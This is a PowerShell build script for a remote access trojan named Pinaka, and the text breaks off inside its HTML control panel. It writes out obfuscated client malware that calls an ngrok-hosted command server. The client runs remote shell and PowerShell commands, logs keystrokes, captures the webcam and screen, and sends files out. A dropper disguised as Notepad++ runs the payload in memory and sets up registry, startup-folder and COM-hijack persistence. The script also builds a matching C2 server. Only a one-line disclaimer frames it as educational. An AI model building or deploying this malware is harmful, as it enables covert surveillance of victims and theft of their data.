# pinaka_build.ps1
# PowerShell script to build Pinaka RAT with ngrok integration, GodRAT enhancements, LOTL techniques, manual setup steps, and enhanced self-contained dropper
# LEGAL DISCLAIMER: This code is for educational purposes only. Unauthorized use on systems without explicit consent is illegal.
# NOTE: Run this script and start_pinaka.bat with administrative privileges to avoid permission issues. Manual setup steps remain as per README.txt.

# --- Configuration ---
$workDir = "C:\Pinaka"
$publicDir = "$workDir\public"
$ngrokDomain = "sharp-prompt-halibut.ngrok-free.app"  # Use raw domain without scheme
$notepadPlusPlusPath = "C:\\Program Files\\Notepad++\\notepad++.exe"
$ngrokWsUrl = "wss://$ngrokDomain/c2"
$ngrokHost = $ngrokDomain

# Create working directory
if (-not (Test-Path $workDir)) {
    Write-Host "Creating working directory at $workDir"
    New-Item -Path $workDir -ItemType Directory -Force
}
Set-Location $workDir

# Create public directory
if (-not (Test-Path $publicDir)) {
    Write-Host "Creating public directory at $publicDir"
    New-Item -Path $publicDir -ItemType Directory -Force
}

# --- Clean previous builds ---
Write-Host "Cleaning previous build artifacts"
Remove-Item -Path "$workDir\dist", "$workDir\build", "*.spec" -Recurse -Force -ErrorAction SilentlyContinue

# --- Generate Fernet Key ---
$secretKeyPath = "$workDir\secret.key"
Write-Host "Checking for existing Fernet key"
if (Test-Path $secretKeyPath) {
    Write-Host "Reusing existing Fernet key from $secretKeyPath"
    $fernetKey = Get-Content -Path $secretKeyPath -Raw
} else {
    Write-Host "Generating new Fernet key"
    $fernetKey = & python -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())" 2>$null
    if (-not $fernetKey) {
        Write-Host "Failed to generate Fernet key. Using default (replace manually if needed)..."
        $fernetKey = "dQw4w9WgXcQ="
    }
    Set-Content -Path $secretKeyPath -Value $fernetKey
    Write-Host "Fernet key saved as $secretKeyPath"
}
# Encode Fernet key for embedding
$base64FernetKey = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($fernetKey))

# --- Verify Fernet Key Consistency ---
Write-Host "Verifying Fernet key integrity"
$testDecode = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64FernetKey))
if ($testDecode -ne $fernetKey) {
    Write-Host "[-] Error: Fernet key encoding/decoding mismatch. Aborting build."
    exit 1
}
Write-Host "[+] Fernet key verified successfully"

# --- Generate combined_pinaka.py with Enhanced Features, Memory Execution, and Obfuscation ---
Write-Host "Creating combined_pinaka.py with memory execution and obfuscation"
$randomJunk = -join ((65..90) + (97..122) | Get-Random -Count 10 | ForEach-Object {[char]$_})
$obfuscatedCode = @"
import os
import sys
import time
import psutil
import cv2
import numpy as np
import json
import base64
import threading
import websocket  # Ensure this is websocket-client
import platform
import random
import string
import subprocess
import logging
import win32api
import win32con
import win32process
import win32event
import win32security
import ctypes
import win32clipboard
import tempfile
from cryptography.fernet import Fernet
from pynput import keyboard
import pyautogui
import io
import socket

# Obfuscated Configuration with Random Junk
random_junk = ''.join(random.choices(string.ascii_letters, k=10))
C2_URLS = [f'wss://{os.environ.get("NGROK_DOMAIN", "sharp-prompt-halibut.ngrok-free.app")}/c2', 'ws://localhost:5000/c2']
KEY_PATH = os.path.join(os.environ.get('APPDATA', tempfile.gettempdir()), 'PinakaRAT', 'secret.key')
try:
    with open(KEY_PATH, 'rb') as f:
        cipher = Fernet(f.read())
except FileNotFoundError:
    # Embed the Fernet key if secret.key is missing
    import base64
    fernet_key = base64.b64decode(b"$base64FernetKey").decode()
    cipher = Fernet(fernet_key.encode())
    logging.warning('secret.key not found, using embedded key')
CLIENT_ID = f"{platform.node()}{random_junk}"
logging.basicConfig(filename=os.path.join(os.environ.get('TEMP', tempfile.gettempdir()), 'pinaka_server.log'), level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Obfuscated Function Definitions
def XxXx_check_deps():
    logging.info('Starting dependency check')
    required = {'requests': 'requests', 'cryptography': 'cryptography', 'opencv-python': 'opencv-python', 'Pillow': 'Pillow', 'psutil': 'psutil', 'numpy': 'numpy', 'websocket-client': 'websocket-client', 'pynput': 'pynput', 'pywin32': 'pywin32', 'pyautogui': 'pyautogui'}
    for pkg, name in required.items():
        try:
            _import_(pkg)
            logging.info(f'[+] {pkg} installed')
        except ImportError:
            logging.warning(f'[!] Missing {pkg}, skipping install in runtime')
            continue

def XxXx_vm_check():
    logging.info('Running VM check')
    if psutil.cpu_count(logical=False) < 2 or 'VIRTUAL' in platform.platform().upper():
        logging.info('VM detected, exiting')
        time.sleep(random.randint(5, 15))
        sys.exit(0)

def XxXx_hidden_folder():
    logging.info('Creating hidden folder')
    hidden_dir = os.path.join(os.environ.get('APPDATA', tempfile.gettempdir()), 'PinakaRAT')
    os.makedirs(hidden_dir, exist_ok=True)
    ctypes.windll.kernel32.SetFileAttributesW(hidden_dir, 0x02)
    logging.info(f'Created {hidden_dir}')

def XxXx_mem_exec(code):
    logging.info('Executing code in memory')
    exec(code)

def XxXx_net_check(url):
    logging.info(f'Checking network connectivity for {url}')
    if url.startswith('ws://localhost'):
        return True  # Always try localhost
    try:
        import requests
        response = requests.get(f'https://{os.environ.get("NGROK_DOMAIN", "sharp-prompt-halibut.ngrok-free.app")}/status', timeout=5)
        return response.status_code == 200
    except:
        return os.system(f'ping -n 1 {os.environ.get("NGROK_DOMAIN", "sharp-prompt-halibut.ngrok-free.app")}') == 0

def XxXx_c2_connect():
    logging.info('Attempting direct WebSocket connection')
    delay = 10
    retry_count = 0
    max_retries = 5

    while retry_count < max_retries:
        for url in C2_URLS:
            if not XxXx_net_check(url) and url.startswith('ws://localhost'):
                logging.info(f'Skipping {url} as it requires local server')
                continue
            try:
                ws = websocket.WebSocket()
                ws.connect(url, header=[
                    f"User-Agent: Mozilla/5.0",
                    f"Origin: https://{os.environ.get('NGROK_DOMAIN', 'sharp-prompt-halibut.ngrok-free.app')}"
                ])
                ws.settimeout(5)  # Set a 5-second timeout for recv()

                ws.send(CLIENT_ID)
                logging.info(f'[+] Connected to {url} with client ID: {CLIENT_ID}')
                return ws
            except Exception as e:
                logging.error(f'[!] Failed to connect to {url}: {e}')
                time.sleep(delay)
                delay = min(delay * 2, 60)
        retry_count += 1
        time.sleep(10)
    logging.error('[!] Max connection retries reached')
    sys.exit(1)

def XxXx_send(ws, data):
    logging.info(f'Sending data: {data}')
    encrypted = cipher.encrypt(data.encode()).decode()
    ws.send(encrypted)

def XxXx_recv(ws):
    logging.info('Receiving data')
    try:
        # WebSocketApp doesn't have recv, handle messages in on_message
        return None  # Placeholder, adjust logic
    except Exception as e:
        logging.error(f'Receive error: {str(e)}')
        return None

def XxXx_inject(p):
    logging.info(f'Injecting process: {p}')
    try:
        h = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, psutil.Process().pid)
        r = win32process.VirtualAllocEx(h, 0, len(p), win32con.MEM_COMMIT, win32con.PAGE_EXECUTE_READWRITE)
        win32process.WriteProcessMemory(h, r, p, len(p))
        t = win32process.CreateRemoteThread(h, None, 0, r, None, 0)
        win32api.CloseHandle(h)
        return 'Injected'
    except Exception as e:
        logging.error(f'Injection error: {str(e)}')
        return 'Injection failed'

def XxXx_mouse(x, y):
    logging.info(f'Moving mouse to {x},{y}')
    win32api.SetCursorPos((x, y))
    return f'Mouse at {x},{y}'

def XxXx_click():
    logging.info('Performing mouse click')
    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, 0, 0)
    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, 0, 0)
    return 'Clicked'

def XxXx_webcam():
    logging.info('Capturing webcam')
    c = cv2.VideoCapture(0)
    ret, frame = c.read()
    c.release()
    if ret:
        ret, buffer = cv2.imencode('.jpg', frame)
        if ret:
            return f'data:image/jpeg;base64,{base64.b64encode(buffer).decode()}'
    return 'Webcam error'

def XxXx_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        buffered = io.BytesIO()
        screenshot.save(buffered, format="JPEG")
        encoded = base64.b64encode(buffered.getvalue()).decode()
        return f"data:image/jpeg;base64,{encoded}"
    except Exception as e:
        return f"cmd:Screenshot error - {str(e)}"

def XxXx_sysinfo():
    try:
        data = {
            "os": platform.platform(),
            "cpu": f"{psutil.cpu_percent()}%",
            "mem": f"{psutil.virtual_memory().percent}%",
            "host": socket.gethostname()
        }
        return "sysinfo:" + json.dumps(data)
    except Exception as e:
        return f"cmd:System info error - {str(e)}"

def XxXx_cmd(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return f"cmd:{output.decode(errors='ignore')}"
    except subprocess.CalledProcessError as e:
        return f"cmd:{e.output.decode(errors='ignore')}"

def XxXx_powershell(command):
    try:
        powershell = ["powershell", "-ExecutionPolicy", "Bypass", "-Command", command]
        output = subprocess.check_output(powershell, stderr=subprocess.STDOUT)
        return f"powershell:{output.decode(errors='ignore')}"
    except subprocess.CalledProcessError as e:
        return f"powershell:{e.output.decode(errors='ignore')}"

def XxXx_exfil(filepath):
    try:
        if os.path.exists(filepath):
            with open(filepath, "rb") as f:
                encoded = base64.b64encode(f.read()).decode()
                return f"exfil:,{encoded}"
        else:
            return "cmd:File not found"
    except Exception as e:
        return f"cmd:Exfiltration error - {str(e)}"

def XxXx_dispatch(cmd):
    try:
        if cmd.startswith("cmd:"):
            return XxXx_cmd(cmd[4:])
        elif cmd.startswith("powershell:"):
            return XxXx_powershell(cmd[11:])
        elif cmd == "screenshot":
            return XxXx_screenshot()
        elif cmd == "sysinfo":
            return XxXx_sysinfo()
        elif cmd.startswith("exfil:"):
            return XxXx_exfil(cmd[6:])
        elif cmd == "exit":
            os._exit(0)
        elif cmd == "webcam":
            return XxXx_webcam()
        elif cmd == "click":
            return XxXx_click()
        elif cmd == "start_keylog":
            return XxXx_start_keylog()
        elif cmd == "stop_keylog":
            return XxXx_stop_keylog()
        elif cmd == "start_screen":
            return XxXx_start_screen(ws)
        elif cmd == "stop_screen":
            return XxXx_stop_screen()
        else:
            return "cmd:Unknown command"
    except Exception as e:
        return f"cmd:Error processing command - {str(e)}"

keylog_active = False
keylog_file = os.path.join(os.environ.get('TEMP', tempfile.gettempdir()), 'keys.txt')

def XxXx_on_press(k):
    if keylog_active:
        try:
            with open(keylog_file, 'a') as f:
                f.write(str(k) + '\n')
        except:
            pass

key_listener = None

def XxXx_start_keylog():
    logging.info('Starting keylogger')
    global keylog_active, key_listener
    if not keylog_active:
        keylog_active = True
        key_listener = keyboard.Listener(on_press=XxXx_on_press)
        key_listener.start()
        XxXx_mem_exec('logging.info("Keylog started in memory")')
        return 'Keylog started'
    return 'Keylog running'

def XxXx_stop_keylog():
    logging.info('Stopping keylogger')
    global keylog_active, key_listener
    if keylog_active:
        keylog_active = False
        if key_listener:
            key_listener.stop()
        if os.path.exists(keylog_file):
            with open(keylog_file, 'r') as f:
                keys = f.read()
            os.remove(keylog_file)
            return f'Keylog stopped: {keys}'
        return 'Keylog stopped'
    return 'Keylog not running'

screen_grab_active = False

def XxXx_screen_thread(ws):
    global screen_grab_active
    while screen_grab_active:
        screenshot = XxXx_screenshot()
        if not screenshot.startswith('Error'):
            XxXx_send(ws, screenshot)
        time.sleep(5)

screen_thread = None

def XxXx_start_screen(ws):
    logging.info('Starting screen capture')
    global screen_grab_active, screen_thread
    if not screen_grab_active:
        screen_grab_active = True
        screen_thread = threading.Thread(target=XxXx_screen_thread, args=(ws,))
        screen_thread.start()
        return 'Screen grab started'
    return 'Screen grab running'

def XxXx_stop_screen():
    logging.info('Stopping screen capture')
    global screen_grab_active, screen_thread
    if screen_grab_active:
        screen_grab_active = False
        if screen_thread:
            screen_thread.join()
        return 'Screen grab stopped'
    return 'Screen grab not running'

def XxXx_main():
    logging.info('Starting main RAT logic')
    logging.info(f'Available functions: {[k for k in globals() if k.startswith("XxXx_")]}')
    XxXx_vm_check()
    XxXx_check_deps()
    XxXx_hidden_folder()
    ws = XxXx_c2_connect()
    inject_code = 'print("Memory injected")'
    XxXx_mem_exec(inject_code)
    logging.info('Injected via memory')

    while True:
        try:
            encrypted_cmd = ws.recv()  # Uses timeout from ws.settimeout(5)
            if encrypted_cmd:
                cmd = cipher.decrypt(encrypted_cmd.encode()).decode()
                logging.info(f'Received command: {cmd}')
                response = XxXx_dispatch(cmd)
                logging.info(f'Dispatch result: {response}')  # Optional debug
                logging.info(f"Sending response: {response}")
                XxXx_send(ws, response)
        except websocket.WebSocketTimeoutException:
            continue  # No command received, retry
        except Exception as e:
            import traceback
            logging.error(f"Error receiving or processing command:\n{traceback.format_exc()}")
            break  # Exit on other errors

if _name_ == '_main_' or 'EXECUTE_IN_MEMORY' in globals():
    try:
        XxXx_main()
    except Exception as e:
        logging.error(f'Main error: {str(e)}')
        sys.exit(1)
"@
Set-Content -Path "combined_pinaka.py" -Value $obfuscatedCode
Write-Host "`n[+] combined_pinaka.py saved. Preview of first few lines:`n"
Get-Content .\combined_pinaka.py -TotalCount 10
if (Test-Path "combined_pinaka.py") {
    $fileHash = Get-FileHash -Path "combined_pinaka.py" -Algorithm MD5
    Write-Host "[+] File hash (MD5): $($fileHash.Hash)"
} else {
    Write-Host "[-] Error: combined_pinaka.py not found after save"
    exit 1
}
Copy-Item -Path "combined_pinaka.py" -Destination "$publicDir\combined_pinaka.py" -Force

# --- Generate base64-encoded combined_pinaka.py for embedding ---
Write-Host "Generating base64-encoded combined_pinaka.py for embedding"
$combinedPinakaContent = Get-Content -Path "combined_pinaka.py" -Raw
if (-not $combinedPinakaContent.Contains("XxXx_check_deps")) {
    Write-Host "[-] Error: combined_pinaka.py missing XxXx_check_deps function"
    exit 1
}
$base64Payload = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($combinedPinakaContent))

# --- Generate unified notepad++.pyw with embedded combined_pinaka.py ---
Write-Host "Creating unified notepad++.pyw with embedded combined_pinaka.py"
$notepadPywCode = @"
import os
import sys
import base64
import logging
import tempfile
import psutil
import ctypes

# Early logging to catch boot errors
try:
    logging.basicConfig(
        filename=os.path.join(os.environ.get('TEMP', tempfile.gettempdir()), 'pinaka_early.log'),
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    logging.info('Started notepad++.pyw')
except Exception as e:
    with open(os.path.join(tempfile.gettempdir(), 'pinaka_early.log'), 'a') as f:
        f.write(f'Boot log error: {str(e)}\n')

# Check for multiple instances
def check_single_instance():
    mutex_name = 'PinakaRAT_Mutex'
    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, mutex_name)
    last_error = ctypes.windll.kernel32.GetLastError()
    if last_error == 183:  # ERROR_ALREADY_EXISTS
        logging.info('Another instance is already running, exiting')
        sys.exit(0)
    logging.info('Single instance verified')

try:
    import zlib
    import subprocess
    import shutil
    import stat
    import win32com.client
    import winreg
    import win32api
    import win32con
    import threading
    import random
    import string
    import time
    from datetime import datetime
    logging.info('Imported all modules')
except Exception as e:
    logging.error(f'Import error: {str(e)}')
    sys.exit(1)

# Debug mode: Disabled for stealth
DEBUG_MODE = False

# === Embed combined_pinaka.py as base64 ===
PAYLOAD = b"$base64Payload"

# === Embed secret.key as base64 ===
FERNET_KEY = b"$base64FernetKey"

# === Constants ===
RAT_DIR = os.path.join(os.environ.get('APPDATA', tempfile.gettempdir()), 'PinakaRAT')
PY_PATH = os.path.join(RAT_DIR, 'combined_pinaka.py')
KEY_PATH = os.path.join(RAT_DIR, 'secret.key')
STARTUP_LNK = os.path.join(
    os.environ.get('APPDATA', tempfile.gettempdir()), r'Microsoft\Windows\Start Menu\Programs\Startup\winupdate.lnk'
)
LOG_FILE = os.path.join(os.environ.get('TEMP', tempfile.gettempdir()), 'pinaka.log')

# === In-memory execution option ===
EXECUTE_IN_MEMORY = True

# === Check critical dependencies ===
def check_critical_deps():
    try:
        import psutil
        import subprocess
        import cryptography
        import pynput
        logging.info('Critical dependencies verified')
        return True
    except ImportError as e:
        logging.error(f'Missing critical dependency: {e}')
        return False

# === Ensure startup folder shortcut ===
def create_startup_shortcut():
    try:
        shell = win32com.client.Dispatch('WScript.Shell')
        shortcut = shell.CreateShortcut(STARTUP_LNK)
        shortcut.TargetPath = sys.executable
        shortcut.Arguments = f'"{PY_PATH}"' if not EXECUTE_IN_MEMORY else f'"{os.path.abspath(_file_)}"'
        shortcut.IconLocation = 'shell32.dll,13'
        shortcut.WindowStyle = 7
        shortcut.Save()
        logging.info('Created startup shortcut')
    except Exception as e:
        logging.error(f'Failed to create startup shortcut: {e}')

# === Registry persistence ===
def set_registry_persistence():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r'Software\Microsoft\Windows\CurrentVersion\Run',
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(
            key,
            'NotepadPlusPlus',
            0,
            winreg.REG_SZ,
            f'"{sys.executable}" "{PY_PATH}"' if not EXECUTE_IN_MEMORY else f'"{sys.executable}" "{os.path.abspath(_file_)}"'
        )
        winreg.CloseKey(key)
        logging.info('Added registry Run key persistence')
    except Exception as e:
        logging.error(f'Registry persistence failed: {e}')

# === COM hijacking persistence ===
def set_com_persistence():
    com_path = r'Software\Classes\CLSID\{{' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=36)) + r'}\InprocServer32'
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, com_path)
        winreg.SetValueEx(
            key,
            '',
            0,
            winreg.REG_SZ,
            f'"{sys.executable}" "{PY_PATH}"' if not EXECUTE_IN_MEMORY else f'"{sys.executable}" "{os.path.abspath(_file_)}"'
        )
        winreg.CloseKey(key)
        logging.info('Added COM hijacking persistence')
    except Exception as e:
        logging.error(f'COM hijacking persistence failed: {e}')

# === Setup persistence ===
def setup():
    try:
        os.makedirs(RAT_DIR, exist_ok=True)
        os.system(f'attrib +h {RAT_DIR}')
        # Write secret.key to RAT_DIR
        if not os.path.exists(KEY_PATH):
            with open(KEY_PATH, 'wb') as f:
                f.write(base64.b64decode(FERNET_KEY))
            logging.info(f'Wrote secret.key to {KEY_PATH}')
        if not EXECUTE_IN_MEMORY and not os.path.exists(PY_PATH):
            with open(PY_PATH, 'wb') as f:
                f.write(base64.b64decode(PAYLOAD))
            os.chmod(PY_PATH, stat.S_IWRITE)
            logging.info(f'Wrote combined_pinaka.py to {PY_PATH}')
        # Temporarily disable persistence for debugging
        # create_startup_shortcut()
        # set_registry_persistence()
        # set_com_persistence()
    except Exception as e:
        logging.error(f'Setup failed: {e}')

# === Elevate if not admin ===
def run_as_admin():
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, _file_, None, 1)
            logging.info('Requested elevation')
            sys.exit(0)
        logging.info('Running with admin privileges')
    except Exception as e:
        logging.error(f'Failed to elevate: {e}')

# === UAC bypass using SilentCleanup ===
def bypass_uac():
    try:
        logging.info('Skipping UAC bypass for debugging')
    except Exception as e:
        logging.error(f'UAC bypass failed: {e}')

# === Anti-debugging ===
def anti_debug():
    try:
        logging.info('Skipping anti-debugging for debugging')
    except Exception as e:
        logging.error(f'Anti-debugging check failed: {e}')

# === Code mutation ===
def mutate_code():
    try:
        junk = ''.join(random.choices(string.ascii_letters + string.digits, k=50))
        if not EXECUTE_IN_MEMORY and os.path.exists(PY_PATH):
            with open(PY_PATH, 'a') as f:
                f.write(f'\n# Mutation: {junk}')
            logging.info(f'Mutated code with junk: {junk}')
        threading.Timer(300, mutate_code).start()
    except Exception as e:
        logging.error(f'Code mutation failed: {e}')

# === Run RAT ===
def run_rat():
    try:
        if not check_critical_deps():
            logging.error('Aborting due to missing dependencies')
            sys.exit(1)
        logging.info('Decoding payload for in-memory execution')
        code = base64.b64decode(PAYLOAD).decode('utf-8')
        if len(code) < 1000:  # Basic sanity check
            logging.error('Payload too short, likely corrupted')
            with open(PY_PATH, 'wb') as f:
                f.write(base64.b64decode(PAYLOAD))
            subprocess.Popen(
                ['python', PY_PATH],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            logging.info(f'Fallback: Started combined_pinaka.py from {PY_PATH}')
            return
        if 'XxXx_check_deps' not in code:
            logging.error('Payload missing XxXx_check_deps, falling back to disk')
            with open(PY_PATH, 'wb') as f:
                f.write(base64.b64decode(PAYLOAD))
            subprocess.Popen(
                ['python', PY_PATH],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            logging.info(f'Fallback: Started combined_pinaka.py from {PY_PATH}')
            return
        logging.info('Executing combined_pinaka.py in memory')
        exec(code, globals())
        logging.info('Executed combined_pinaka.py in memory')
        # Explicitly start main logic after memory exec
        if 'XxXx_main' in globals():
            globals()['XxXx_main']()
        else:
            logging.error('XxXx_main() not found after exec')
    except Exception as e:
        logging.error(f'Failed to run RAT: {str(e)}')
        with open(PY_PATH, 'wb') as f:
            f.write(base64.b64decode(PAYLOAD))
        subprocess.Popen(
            ['python', PY_PATH],
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        logging.info(f'Fallback: Started combined_pinaka.py from {PY_PATH}')
        sys.exit(1)

if _name_ == '_main_':
    try:
        check_single_instance()
        logging.info('Main execution started')
        run_as_admin()
        bypass_uac()
        anti_debug()
        setup()
        mutate_code()
        run_rat()
        logging.info('Main execution completed')
    except Exception as e:
        logging.error(f'Main execution failed: {str(e)}')
        sys.exit(1)
"@
Set-Content -Path "notepad++.pyw" -Value $notepadPywCode

# --- Embed and Write c2_server.py ---
Write-Host "Creating c2_server.py"
$c2ServerCode = @"
import os
import sys
import logging
import subprocess
import json
from datetime import datetime
from cryptography.fernet import Fernet
from flask import Flask, request, send_from_directory, jsonify
from flask_sock import Sock
import queue
import cv2
from PIL import Image
import numpy as np
import base64
import io
import threading
import time

clients = {}
responses = {}

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(_name_)

app = Flask(_name_, static_url_path='/public', static_folder='C:\\Pinaka\\public', template_folder='C:\\Pinaka\\public')
sock = Sock(app)

def load_key():
    key_file = 'secret.key'
    if os.path.exists(key_file):
        with open(key_file, 'rb') as f:
            return Fernet(f.read())
    else:
        import base64
        embedded_key = base64.b64decode(b"$base64FernetKey").decode()
        return Fernet(embedded_key.encode())

cipher = load_key()

def check_and_install_dependencies():
    required_packages = [
        'requests', 'cryptography', 'opencv-python', 'Pillow', 'psutil',
        'numpy', 'websocket-client', 'flask', 'flask-sock', 'pynput', 'pywin32', 'pyautogui'
    ]
    for package in required_packages:
        try:
            _import_(package)
            logger.info(f"[+] {package} is already installed.")
        except ImportError:
            logger.warning(f"[!] Missing dependency: {package}. Attempting to install...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                logger.info(f"[+] Successfully installed {package}.")
            except subprocess.CalledProcessError as e:
                logger.error(f"[!] Failed to install {package}. Error: {e}. Please install manually with 'pip install {package}'.")

@sock.route('/c2')
def c2(ws):
    logger.info("✅ WebSocket connection established")

    try:
        client_id = ws.receive(timeout=5)
        if not client_id:
            logger.error("[!] No client ID received, closing connection")
            return
    except Exception as e:
        logger.error(f"[!] Error receiving client ID: {e}")
        return

    logger.info(f"[+] Client connected: {client_id}")
    clients[client_id] = {'queue': queue.Queue(), 'socket': ws, 'connected': True}
    if client_id not in responses:
        responses[client_id] = []

    def sender():
        while True:
            try:
                if clients[client_id]['connected']:
                    cmd = clients[client_id]['queue'].get()
                    encrypted = cipher.encrypt(cmd.encode()).decode()
                    logger.info(f"[>] Sending command to {client_id}: {cmd}")
                    ws.send(encrypted)
            except Exception as e:
                logger.warning(f"[!] Error sending to {client_id}: {e}")
                break

    def receiver():
        while True:
            try:
                if clients[client_id]['connected']:
                    encrypted_response = ws.receive()
                    if encrypted_response:
                        decrypted = cipher.decrypt(encrypted_response.encode()).decode()
                        logger.info(f"[<] Response from {client_id}: {decrypted}")
                        responses[client_id].append({
                            'message': decrypted,
                            'time': datetime.now().isoformat()
                        })

                        # Ensure response folder exists
                        base_path = os.path.join("C:\\Pinaka", "Response")
                        os.makedirs(base_path, exist_ok=True)
                        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')

                        # Screenshot
                        if decrypted.startswith('data:image'):
                            img_data = base64.b64decode(decrypted.split(',')[1])
                            img = Image.open(io.BytesIO(img_data))
                            file_path = os.path.join(base_path, f"screenshot_{client_id}_{timestamp}.png")
                            img.save(file_path)
                            logger.info(f"📸 Saved screenshot to {file_path}")

                        # Webcam
                        elif decrypted.startswith('webcam:'):
                            img_data = base64.b64decode(decrypted.split(':')[1])
                            file_path = os.path.join(base_path, f"webcam_{client_id}_{timestamp}.png")
                            with open(file_path, 'wb') as f:
                                f.write(img_data)
                            logger.info(f"📷 Saved webcam capture to {file_path}")

                        # Sysinfo
                        elif decrypted.startswith('sysinfo:'):
                            file_path = os.path.join(base_path, f"sysinfo_{client_id}_{timestamp}.txt")
                            with open(file_path, 'w', encoding='utf-8') as f:
                                f.write(decrypted[len('sysinfo:'):].strip())
                            logger.info(f"📝 Saved system info to {file_path}")

                        # Exfil
                        elif decrypted.startswith('exfil:'):
                            file_data = base64.b64decode(decrypted.split(',', 1)[1])
                            file_path = os.path.join(base_path, f"exfil_{client_id}_{timestamp}.bin")
                            with open(file_path, 'wb') as f:
                                f.write(file_data)
                            logger.info(f"📁 Saved exfil data to {file_path}")
            except Exception as e:
                logger.warning(f"[!] Lost connection with {client_id}: {e}")
                break

    threading.Thread(target=sender, daemon=True).start()
    threading.Thread(target=receiver, daemon=True).start()

    while True:
        time.sleep(1)

    logger.info(f"[~] Client {client_id} disconnected")
    clients[client_id]['socket'] = None

@app.route('/')
def index():
    logger.info("Serving index.html")
    return send_from_directory('C:\\Pinaka\\public', 'index.html')

@app.route('/control')
def control():
    logger.info("Serving control.html")
    return send_from_directory('C:\\Pinaka\\public', 'control.html')

@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.get_json()
    client_id = data.get('client')
    cmd = data.get('cmd')

    if not client_id or not cmd:
        return jsonify({'error': 'Missing client or command'}), 400

    if client_id not in clients or not clients[client_id].get('connected', False):
        return jsonify({'error': f'Client {client_id} not connected'}), 404

    clients[client_id]['queue'].put(cmd)
    return jsonify({'status': f'Command "{cmd}" sent to {client_id}'})

@app.route('/get_responses')
def get_responses():
    client_id = request.args.get('client')
    if client_id:
        msgs = responses.get(client_id, [])
        responses[client_id] = []  # Clear after sending
        return jsonify({'responses': msgs, 'connected': clients.get(client_id, {}).get('connected', False)})
    else:
        return jsonify({'clients': list(clients.keys())})

@app.route('/<path:path>')
def serve_static(path):
    logger.info(f"Serving static file: {path}")
    return send_from_directory('C:\\Pinaka\\public', path)

if _name_ == '_main_':
    check_and_install_dependencies()
    logger.info("Starting Flask server on 0.0.0.0:5000 for development (use Waitress in production)")
    app.run(host='0.0.0.0', port=5000, debug=False)
else:
    application = app
"@
Set-Content -Path "c2_server.py" -Value $c2ServerCode
Copy-Item -Path "c2_server.py" -Destination "$publicDir\c2_server.py" -Force

# --- Embed and Write index.html ---
Write-Host "Creating index.html"
$indexHtmlContent = @"
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Pinaka Control Panel</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap');

    body {
      background-color: #0b1d33;
      font-family: 'Open Sans', sans-serif;
      color: #ffffff;
      margin: 0;
      padding: 20px;
    }

    h1 {
      text-align: center;
      color: #ffffff;
      margin-bottom: 20px;
    }

    .card {
      background-color: #12294a;
      border-radius: 16px;
      padding: 20px;
      margin-bottom: 20px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
    }

    .section-title {
      font-size: 18px;
      font-weight: 600;
      margin-bottom: 12px;
      color: #00aaff;
      text-transform: uppercase;
    }

    select, input[type="text"] {
      background-color: #1a3556;
      border: none;
      border-radius: 8px;
      padding: 10px;
      color: white;
      width: 100%;
      margin-bottom: 10px;
    }

    button {
      background-color: #1e90ff;
      border: none;
      border-radius: 12px;
      padding: 10px 16px;
      color: white;
      font-weight: 600;
      margin: 6px;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background-color: #4682b4;
    }

    #responseBox {
      background-color: #1a3556;
      padding: 12px;
      border-radius: 10px;
      min-height: 150px;
      max-height: 300px;
      overflow-y: auto;
      font-size: 14px;
      white-space: pre-wrap;
    }

    .btn-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
      gap: 10px;
    }
  </style>
</head>
<body>
  <h1>PINAKA Control</h1>

  <div class="card">
    <div class="section-title">Client Connection</div>
    <select id="clientSelect">
      <option value="">Select Client</option>
    </select>
    <button onclick="updateClients()">Refresh Clients</button>
  </div>

  <div class="card">
    <div class="section-title">Quick Commands</div>
    <div class="btn-grid">
      <button onclick="sendCommand('screenshot')">Screenshot</button>
      <button onclick="sendCommand('sysinfo')">Sys Info</button>
      <button onclick="sendCommand('webcam')">Webcam</button>
      <button onclick="sendCommand('start_keylog')">Start Keylog</button>
      <button onclick="sendCommand('stop_keylog')">Stop Keylog</button>
      <button onclick="sendCommand('start_screen')">Start Screen</button>
      <button onclick="sendCommand('stop_screen')">Stop Screen</button>
      <button onclick="sendCommand('start_clipboard')">Clipboard</button>
      <button onclick="sendCommand('start_hvnc')">Start HVNC</button>
      <button onclick="sendCommand('stop_hvnc')">Stop HVNC</button>
      <button onclick="sendCommand('exit')">Exit</button>
      <button onclick="sendCommand('destruct')">Destruct</button>
    </div>
  </div>

  <div class="card">
    <div class="section-title">Manual Command</div>
    <input type="text" id="commandInput" placeholder="Enter command here...">
    <button onclick="manualCommand()">Send Command</button>
  </div>

  <div class="card">
    <div class="section-title">Responses</div>
    <div id="responseBox">Waiting for responses...</div>
  </div>

  <script>
    let selectedClient = null;

    function updateClient() {
      selectedClient = document.getElementById('clientSelect').value;
    }

